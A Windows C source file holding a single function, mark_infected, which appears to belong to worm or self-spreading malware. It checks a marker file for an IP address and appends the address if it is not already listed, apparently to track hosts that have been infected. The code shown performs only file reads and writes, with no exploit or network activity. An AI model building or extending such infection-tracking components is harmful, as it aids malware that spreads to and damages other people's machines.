#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include "config.h"

int mark_infected(const char *ip)
{
    HANDLE file;
    LARGE_INTEGER file_size;
    LARGE_INTEGER position;
    unsigned char *contents = NULL;
    size_t ip_length;
    size_t contents_length;
    size_t start;
    size_t i;
    DWORD bytes_read;
    BOOL ok;
    int result = -1;

    if (ip == NULL)
        return -1;

    ip_length = strlen(ip);
    if (ip_length == 0 || strchr(ip, '\n') != NULL || strchr(ip, '\r') != NULL)
        return -1;

    file = CreateFileA(SELF_MARKER, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE)
        return -1;

    if (!GetFileSizeEx(file, &file_size) || file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > (uint64_t)(SIZE_MAX - 1))
        goto cleanup;

    contents_length = (size_t)file_size.QuadPart;
    contents = (unsigned char *)malloc(contents_length + 1);
    if (contents == NULL)
        goto cleanup;

    position.QuadPart = 0;
    if (!SetFilePointerEx(file, position, NULL, FILE_BEGIN))
        goto cleanup;

    i = 0;
    while (i < contents_length) {
        DWORD amount = (contents_length - i > (size_t)MAXDWORD)
                           ? MAXDWORD
                           : (DWORD)(contents_length - i);
        if (!ReadFile(file, contents + i, amount, &bytes_read, NULL) ||
            bytes_read == 0)
            goto cleanup;
        i += bytes_read;
    }

    start = 0;
    for (i = 0; i <= contents_length; ++i) {
        if (i == contents_length || contents[i] == '\n') {
            size_t line_length = i - start;
            if (line_length != 0 && contents[start + line_length - 1] == '\r')
                --line_length;
            if (line_length == ip_length &&
                memcmp(contents + start, ip, ip_length) == 0) {
                result = 1;
                goto cleanup;
            }
            start = i + 1;
        }
    }

    position.QuadPart = file_size.QuadPart;
    if (!SetFilePointerEx(file, position, NULL, FILE_BEGIN))
        goto cleanup;

    {
        const char *parts[3];
        size_t lengths[3];
        size_t part;
        size_t original_length = contents_length;

        parts[0] = "\n";
        lengths[0] = (contents_length != 0 &&
                      contents[contents_length - 1] != '\n') ? 1 : 0;
        parts[1] = ip;
        lengths[1] = ip_length;
        parts[2] = "\n";
        lengths[2] = 1;

        for (part = 0; part < 3; ++part) {
            size_t written = 0;
            while (written < lengths[part]) {
                size_t remaining = lengths[part] - written;
                DWORD amount = remaining > (size_t)MAXDWORD
                                   ? MAXDWORD
                                   : (DWORD)remaining;
                DWORD bytes_written = 0;

                ok = WriteFile(file, parts[part] + written, amount,
                               &bytes_written, NULL);
                if (!ok || bytes_written == 0) {
                    position.QuadPart = (LONGLONG)original_length;
                    if (SetFilePointerEx(file, position, NULL, FILE_BEGIN))
                        SetEndOfFile(file);
                    goto cleanup;
                }
                written += bytes_written;
            }
        }
    }

    result = 0;

cleanup:
    free(contents);
    CloseHandle(file);
    return result;
}